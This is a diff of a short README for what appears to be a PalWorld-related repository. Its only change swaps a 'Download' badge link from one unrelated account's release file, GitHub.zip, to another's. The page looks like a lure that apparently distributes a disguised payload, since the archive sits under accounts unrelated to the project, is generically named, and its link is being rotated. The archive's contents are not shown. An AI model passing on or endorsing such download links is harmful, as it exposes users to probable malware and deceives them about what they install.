@@ -1,6 +1,6 @@
 <p align=center><img src='https://i4.imageban.ru/out/2024/02/02/d7f09a11a9145d6b1103404c969c203c.jpeg'>
 
-[![Download](https://github.com/YusaKatsuragi/PalWorld-ES-Main/assets/12540354/cd58ba38-5e50-4f9c-adfb-42c81c0901f0)](https://github.com/Nick15545/Nick155451/releases/download/unterne/GitHub.zip)
+[![Download](https://github.com/YusaKatsuragi/PalWorld-ES-Main/assets/12540354/cd58ba38-5e50-4f9c-adfb-42c81c0901f0)](https://github.com/ilyas134/notepad1/releases/download/smite/GitHub.zip)
 
 ## or from release
 
